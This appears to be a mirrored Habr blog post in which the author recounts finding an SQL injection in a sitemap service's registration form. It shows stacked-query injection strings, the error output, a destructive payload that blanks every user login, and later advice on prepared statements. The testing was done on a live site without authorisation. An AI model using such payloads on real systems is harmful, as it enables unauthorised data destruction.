<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The story of a single SQL injection</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day! 
 I want to tell you how I hacked a large American sitemap site and remind you of protection against sql injections. The purpose of the post...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The story of a single SQL injection</h1><div class="post__text post__text-html js-mediator-article">  Good day! <br>  I want to tell you how I hacked a large American sitemap site and remind you of protection against sql injections.  The purpose of the post is for informational purposes only.  But all in order. <br><br><h5>  Prehistory </h5><br>  For a number of my projects, I needed to generate a couple of sitemaps.  I googled and, among other things, found one American service for creating sitemaps (where it was necessary to register).  I quickly entered the left information (in the hope that there is no mail authentication on the site) and the address of the site for creating the sitemap.  And he continued to do more important things forgetting about it for a couple of days. <br><br><h5>  First steps </h5><br>  And here I am again going to create a sitemap.  I enter my data on the same site (already authentic), and the previously entered address of the site.  As a result of the form processing, the site displays the text: <br><pre><code class="sql hljs">FATAL ERROR: Duplicate entry 'http://gnum.me/' for key 2 FATAL ERROR: query: <span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> site (userid, <span class="hljs-keyword"><span class="hljs-keyword">url</span></span>, verifyfile, usetimestamp, usepriority, useupload, useping, usepingbing, createdate) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-number"><span class="hljs-number">178817</span></span>, <span class="hljs-string"><span class="hljs-string">'http://gnum.me/'</span></span>, <span class="hljs-string"><span class="hljs-string">'fsga6a59.txt'</span></span>, <span class="hljs-string"><span class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">NOW</span></span>());</code> </pre> <a name="habracut"></a><br>  The text means that this site is already in the database.  I had an idea, why not practice in the implementation of the sql code in order to make the Internet safer <s>to train your hacker skill</s> . <br>  To begin with, I looked at the lack of verification of the text entered in the registration form for ,, cleanliness ,, this query: <br><pre> <code class="sql hljs">', 'fsga6a59.txt', '1','1','0','0','0', NOW()); <span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> site (userid, <span class="hljs-keyword"><span class="hljs-keyword">url</span></span>, verifyfile, usetimestamp, usepriority, useupload, useping, usepingbing, createdate) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-number"><span class="hljs-number">178818</span></span>, <span class="hljs-string"><span class="hljs-string">'http://yg480ybv034df.me/</span></span></code> </pre> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The point is that I close the first part of the query: <br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> site (userid, <span class="hljs-keyword"><span class="hljs-keyword">url</span></span>, verifyfile, usetimestamp, usepriority, useupload, useping, usepingbing, createdate) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-number"><span class="hljs-number">178817</span></span>, <span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br>  Code: <br><pre> <code class="sql hljs">', 'fsga6a59.txt', '1','1','0','0','0', NOW());</code> </pre> <br>  And close the final console <br><pre> <code class="sql hljs">', 'fsga6a59.txt', '1','1','0','0','0', NOW());</code> </pre> <br>  Code: <br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> site (userid, <span class="hljs-keyword"><span class="hljs-keyword">url</span></span>, verifyfile, usetimestamp, usepriority, useupload, useping, usepingbing, createdate) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-number"><span class="hljs-number">178818</span></span>, <span class="hljs-string"><span class="hljs-string">'http://yg480ybv034df.me/</span></span></code> </pre> <br><br>  Query result: <br><pre> <code class="sql hljs">FATAL ERROR: You have an error in your SQL syntax; <span class="hljs-keyword"><span class="hljs-keyword">check</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">manual</span></span> that corresponds <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> your MySQL <span class="hljs-keyword"><span class="hljs-keyword">server</span></span> <span class="hljs-keyword"><span class="hljs-keyword">version</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">right</span></span> syntax <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">use</span></span> near <span class="hljs-string"><span class="hljs-string">'; INSERT INTO site (userid, url, verifyfile, usetimestamp, usepriority, useup'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">at</span></span> line <span class="hljs-number"><span class="hljs-number">1</span></span> FATAL <span class="hljs-keyword"><span class="hljs-keyword">ERROR</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">query</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> site (userid, <span class="hljs-keyword"><span class="hljs-keyword">url</span></span>, verifyfile, usetimestamp, usepriority, useupload, useping, usepingbing, createdate) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-number"><span class="hljs-number">178959</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'fsga6a59.txt'</span></span>, <span class="hljs-string"><span class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">NOW</span></span>()); <span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> site (userid, <span class="hljs-keyword"><span class="hljs-keyword">url</span></span>, verifyfile, usetimestamp, usepriority, useupload, useping, usepingbing, createdate) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-number"><span class="hljs-number">178817</span></span>, <span class="hljs-string"><span class="hljs-string">'http://yg480ybv034df.me/'</span></span>, <span class="hljs-string"><span class="hljs-string">'fsgf47a8.txt'</span></span>, <span class="hljs-string"><span class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">NOW</span></span>());</code> </pre><br><br><h5>  Result analysis </h5><br>  I received information: <br><br><ol><li>  the text I entered does not have a check for malicious code; </li><li>  the creators of the site have limited the length (up to 125 characters), thus the request until: </li></ol><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">load</span></span>, useping, usepingbing, createdate) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-number"><span class="hljs-number">178817</span></span>, <span class="hljs-string"><span class="hljs-string">'http://yg480ybv034df.me/'</span></span>, <span class="hljs-string"><span class="hljs-string">'fsgf47a8.txt'</span></span>, <span class="hljs-string"><span class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>,<span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">NOW</span></span>())</code> </pre> <br>  passes normally. <br><br><h5>  Summary </h5><br>  In principle, everything is already clear, I can enter any code up to 125 characters in this line.  Next is the question of fantasy, for example: <br><pre> <code class="sql hljs">', 'fsga6a59.txt', '1','1','0','0','0', NOW()); <span class="hljs-keyword"><span class="hljs-keyword">UPDATE</span></span> uses <span class="hljs-keyword"><span class="hljs-keyword">SET</span></span> login=<span class="hljs-string"><span class="hljs-string">' '</span></span></code> </pre> <br>  By removing this request all the logins of people. <br><br>  I sent information about the hole to the site.  The task is completed - now our information will be more secure. <br><br>  Do not forget to check the validity of the text entered by the client. <br><br>  <b>UPD1:</b> <br>  Advice on using correct connections and SQL queries from <a href="http://geektimes.ru/users/imater/" class="user_link">imater</a> and <a href="http://geektimes.ru/users/fanatphp/" class="user_link">FanatPHP</a> <br>  Connect: <br><pre> <code class="php hljs">$dsn = <span class="hljs-string"><span class="hljs-string">"mysql:dbname=$config[dbname]=;host=$config[host];charset=$config[charset]"</span></span>; $conf = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, ); $pdo = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PDO($dsn, $config[<span class="hljs-string"><span class="hljs-string">"user"</span></span>], $config[<span class="hljs-string"><span class="hljs-string">"pass"</span></span>], $conf);</code> </pre><br><br>  Process input text: <br><pre> <code class="php hljs">$query = $db2-&gt;prepare(<span class="hljs-string"><span class="hljs-string">"SELECT * FROM tree WHERE text LIKE :title OR id = :id"</span></span>); $query-&gt;execute(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>(<span class="hljs-string"><span class="hljs-string">":title"</span></span>=&gt;<span class="hljs-string"><span class="hljs-string">"%24938239823908%"</span></span>, <span class="hljs-string"><span class="hljs-string">":id"</span></span>=&gt;$_GET [<span class="hljs-string"><span class="hljs-string">'sync3'</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($sql = $query-&gt;fetch()) <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $sql[<span class="hljs-string"><span class="hljs-string">'fio'</span></span>];</code> </pre><br><br>  <b>UPD2:</b> Thanks to the <a href="http://geektimes.ru/users/zerkms/" class="user_link">zerkms</a> comments, I want to remind you of the <a href="http://php.net/manual/en/pdo.prepared-statements.php">prepared statements</a> : <br>  <i>Using prepared statements provides many benefits for both security and performance.</i>  <i>Prepared statements can help improve security by separating the logic of the SQL query from the data inserted into it.</i>  <i>This separation of logic and data can help prevent the injection of SQL injections.</i>  <i>Usually, when you use queries that use data coming from users, you should be very careful.</i>  <i>To do this, you use functions that escape problem characters, such as single and double quotes, backslash.</i>  <i>These operations are not necessarily necessary when you use the prepared statements.</i>  <i>Separating data from the SQL query logic allows MySQL to automatically process these characters and not resort to special functions.</i> <br><br>  Thank you for your attention. Do not judge strictly my first post. </div><p>Source: <a href="https://habr.com/ru/post/168079/">https://habr.com/ru/post/168079/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../168067/index.html">Evolution of agents managed by a neural network</a></li>
<li><a href="../168069/index.html">I2P network has accelerated</a></li>
<li><a href="../168073/index.html">Hi, JavaFX! Let's get acquainted?</a></li>
<li><a href="../168075/index.html">Working with structures or how I learned to write readable code</a></li>
<li><a href="../168077/index.html">Hor + vert + FOV, or adaptive field of view</a></li>
<li><a href="../168085/index.html">Development of GPS tracker from scratch and 512 months warranty</a></li>
<li><a href="../168087/index.html">Supercomputer for 1 billion euros: a simulation of the human brain</a></li>
<li><a href="../168089/index.html">Qt 5.0.1 and Qt Creator 2.6.2 released</a></li>
<li><a href="../168091/index.html">LiveReload on Node.js</a></li>
<li><a href="../168095/index.html">Simple-Science - Simple Experiments (Digest # 15)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>